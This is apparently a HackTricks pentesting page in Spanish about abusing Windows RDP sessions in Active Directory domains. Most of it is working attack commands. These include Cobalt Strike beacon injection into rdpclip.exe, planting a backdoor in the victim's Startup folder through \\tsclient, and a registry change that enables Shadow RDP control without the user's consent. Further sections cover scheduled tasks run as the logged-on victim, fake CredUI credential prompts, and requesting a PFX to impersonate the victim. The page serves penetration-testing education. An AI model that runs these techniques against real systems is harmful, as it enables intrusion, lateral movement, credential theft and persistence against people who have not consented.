# Abuso de sesiones RDP

{{#include ../../banners/hacktricks-training.md}}

## Inyección de procesos RDP

Si el **grupo externo** tiene **acceso RDP** a cualquier **equipo** del dominio actual, un **atacante** podría **comprometer ese equipo y esperarle**.

Una vez que ese usuario haya accedido mediante RDP, el **atacante puede pivotar a la sesión de ese usuario** y abusar de sus permisos en el dominio externo.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Check **other ways to steal sessions with other tools** [**en esta página.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Si un usuario accede mediante **RDP a una máquina** donde un **atacante** lo está **esperando**, el atacante podrá **inyectar un beacon en la sesión RDP del usuario** y, si la **víctima montó su unidad** al acceder mediante RDP, el **atacante podría acceder a ella**.

En este caso, simplemente podrías **comprometer** el **equipo original de la víctima** escribiendo un **backdoor** en la **carpeta de inicio**.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

Si eres **administrador local** en un host donde la víctima ya tiene una **sesión RDP activa**, es posible que puedas **ver/controlar ese escritorio sin robar la contraseña ni volcar LSASS**.<sup>[[1]](#references)</sup>

Esto depende de la directiva de **shadowing de Remote Desktop Services** almacenada en:<sup>[[2]](#references)[[3]](#references)</sup>
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
Valores interesantes:

- `0`: Deshabilitado
- `1`: `EnableInputNotify` (control, se requiere aprobación del usuario)
- `2`: `EnableInputNoNotify` (control, **sin aprobación del usuario**)
- `3`: `EnableNoInputNotify` (solo visualización, se requiere aprobación del usuario)
- `4`: `EnableNoInputNoNotify` (solo visualización, **sin aprobación del usuario**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Esto es especialmente útil cuando un usuario privilegiado conectado mediante RDP dejó abierto un escritorio desbloqueado, una sesión de KeePass, una consola MMC, una sesión del navegador o un shell de administrador.

## Scheduled Tasks As Logged-On User

Si eres **administrador local** y el usuario objetivo tiene una sesión **iniciada actualmente**, Task Scheduler puede iniciar código **como ese usuario sin su contraseña**.<sup>[[1]](#references)[[4]](#references)</sup>

Esto convierte la sesión de inicio de sesión existente de la víctima en una primitiva de ejecución:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Notas:

- Si el usuario **no ha iniciado sesión**, Windows normalmente requiere la contraseña para crear una tarea que se ejecute como ese usuario.
- Si el usuario **ha iniciado sesión**, la tarea puede reutilizar el contexto de inicio de sesión existente.
- Esta es una forma práctica de ejecutar acciones de GUI o iniciar binarios dentro de la sesión de la víctima sin interactuar con LSASS.

## Abuso de CredUI desde la sesión de la víctima

Una vez que puedas ejecutar **dentro del escritorio interactivo de la víctima** (por ejemplo, mediante **Shadow RDP** o **una tarea programada ejecutándose como ese usuario**), puedes mostrar un **prompt real de credenciales de Windows** usando las APIs de CredUI y capturar las credenciales introducidas por la víctima.<sup>[[1]](#references)</sup>

APIs relevantes:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Flujo típico:

1. Iniciar un binario en la sesión de la víctima.
2. Mostrar un prompt de autenticación de dominio que coincida con la imagen corporativa del dominio actual.
3. Desempaquetar el búfer de autenticación devuelto.
4. Validar las credenciales proporcionadas y, opcionalmente, seguir mostrando prompts hasta que se introduzcan credenciales válidas.

Esto resulta útil para el **phishing en el host** porque el prompt es generado por las APIs estándar de Windows en lugar de un formulario HTML falso.

## Solicitar un PFX en el contexto de la víctima

La misma primitiva de **scheduled-task-as-user** puede utilizarse para solicitar un **certificado/PFX como la víctima que ha iniciado sesión**. Posteriormente, ese certificado puede utilizarse para la **autenticación en AD** como ese usuario, evitando por completo el robo de contraseñas.<sup>[[1]](#references)[[5]](#references)</sup>

Flujo de alto nivel:

1. Obtener **local admin** en un host donde la víctima haya iniciado sesión.
2. Ejecutar la lógica de inscripción/exportación como la víctima mediante una **tarea programada**.
3. Exportar el **PFX** resultante.
4. Utilizar el PFX para la autenticación PKINIT / basada en certificados en AD.

Consulta las páginas de AD CS para continuar con el abuso:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## Referencias

- [1] [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [3] [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
